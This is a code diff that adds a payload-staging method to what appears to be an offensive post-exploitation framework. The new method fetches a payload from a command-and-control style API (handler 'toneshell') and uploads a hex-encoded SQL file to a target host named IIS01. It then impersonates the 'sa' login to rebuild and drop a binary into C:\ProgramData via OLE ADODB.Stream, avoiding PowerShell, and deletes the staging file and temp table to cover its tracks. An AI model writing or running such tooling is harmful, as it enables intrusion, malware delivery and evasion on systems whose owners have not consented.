@@ -28,6 +28,44 @@ class StagingMixin:
         self._exec_q(shell, "EXECUTE AS LOGIN='sa';IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
         print(f"[+] xpstage done → {out_path}")
 
+    def cmd_xpstage_hex(self, shell, payload_name: str, timeout_s: int = 120):
+        """Stage binary to IIS01 via hex SQL + T-SQL ADODB.Stream decode (no .ps1)."""
+        resp = shell._post_json("/api/v1.0/mssql/stage", {
+            "handler": "toneshell",
+            "payload": payload_name,
+            "format": "hex",
+        })
+        sql_file = resp["sqlFile"]
+
+        remote_sql = f"C:\\Windows\\Temp\\{sql_file}"
+        shell.cmd_put_wait(sql_file, remote_sql)
+        shell.cmd_exec_raw(f'{self._sqlcmd_prefix()} -i {remote_sql}')
+
+        out_path = f"C:\\ProgramData\\{payload_name}"
+        decode_tsql = (
+            "EXECUTE AS LOGIN='sa';"
+            "DECLARE @hex VARCHAR(MAX)='';"
+            "SELECT @hex=@hex+CAST(chunk AS VARCHAR(MAX))"
+            " FROM tempdb..stg ORDER BY id;"
+            "DECLARE @bin VARBINARY(MAX)="
+            "CONVERT(VARBINARY(MAX),'0x'+@hex,1);"
+            "DECLARE @obj INT,@hr INT;"
+            "EXEC @hr=sp_OACreate 'ADODB.Stream',@obj OUT;"
+            "EXEC sp_OASetProperty @obj,'Type',1;"
+            "EXEC sp_OAMethod @obj,'Open';"
+            "EXEC sp_OAMethod @obj,'Write',NULL,@bin;"
+            f"EXEC sp_OAMethod @obj,'SaveToFile',NULL,"
+            f"'{self._tsql_escape(out_path)}',2;"
+            "EXEC sp_OAMethod @obj,'Close';"
+            "EXEC sp_OADestroy @obj;"
+        )
+        self._exec_q(shell, decode_tsql, timeout_s=timeout_s)
+
+        shell.cmd_exec_raw(f'cmd /c del /f {remote_sql}')
+        self._exec_q(shell, "EXECUTE AS LOGIN='sa';"
+            "IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
+        print(f"[+] xpstage-hex done → {out_path}")
+
     def _build_decrypt_ps(self, key_b64: str, out_path: str) -> str:
         sqlclient_host = self._host.replace(':', ',')
         connstr = f'Server={sqlclient_host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
